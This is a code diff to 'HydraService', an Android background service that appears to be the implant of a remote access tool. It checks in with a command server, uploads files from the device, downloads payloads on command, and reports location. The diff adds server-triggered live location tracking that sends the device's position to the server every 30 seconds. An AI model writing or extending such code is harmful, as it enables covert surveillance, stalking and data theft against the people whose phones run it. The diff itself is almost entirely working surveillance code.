@@ -36,6 +36,10 @@ class HydraService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private val serverBaseUrl = "https://10.0.2.2:8443"
     
+    // --- LIVE TRACKING VARIABLES ---
+    private var isTracking = false
+    private val trackingInterval = 30000L // 30 seconds
+    
     // Initialize Location Helper
     private val locationHelper by lazy { LocationHelper(this) }
 
@@ -43,6 +47,18 @@ class HydraService : Service() {
         override fun run() {
             performCheckIn()
             handler.postDelayed(this, heartbeatInterval)
+        }
+    }
+
+    // --- LIVE TRACKING RUNNABLE ---
+    private val locationTrackingRunnable = object : Runnable {
+        override fun run() {
+            if (isTracking) {
+                locationHelper.getCurrentLocation { report ->
+                    sendReport("location_update", "[LIVE] $report")
+                }
+                handler.postDelayed(this, trackingInterval)
+            }
         }
     }
 
@@ -105,7 +121,6 @@ class HydraService : Service() {
         return if (level != -1 && scale != -1) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
     }
 
-    // --- EXFILTRATION (UPLOAD) ---
     fun uploadFile(filePath: String, clientId: String, serverUrl: String) {
         val file = File(filePath)
         if (!file.exists()) {
@@ -134,7 +149,6 @@ class HydraService : Service() {
         })
     }
 
-    // --- INFILTRATION (DOWNLOAD) ---
     fun downloadFile(filename: String, serverUrl: String, context: Context) {
         val request = Request.Builder()
             .url("$serverUrl/download/$filename")
@@ -212,6 +226,18 @@ class HydraService : Service() {
                             sendReport("location_update", report)
                         }
                     }
+                    "location_start" -> {
+                        if (!isTracking) {
+                            isTracking = true
+                            handler.post(locationTrackingRunnable)
+                            Log.i(TAG, "[+] Live tracking started")
+                        }
+                    }
+                    "location_stop" -> {
+                        isTracking = false
+                        handler.removeCallbacks(locationTrackingRunnable)
+                        Log.i(TAG, "[-] Live tracking stopped")
+                    }
                     "download" -> {
                         val filename = data.optString("filename", "payload.bin")
                         downloadFile(filename, serverBaseUrl, this)
@@ -267,6 +293,7 @@ class HydraService : Service() {
 
     override fun onDestroy() {
         handler.removeCallbacks(checkInRunnable)
+        handler.removeCallbacks(locationTrackingRunnable)
         if (wakeLock?.isHeld == true) wakeLock?.release()
         super.onDestroy()
     }
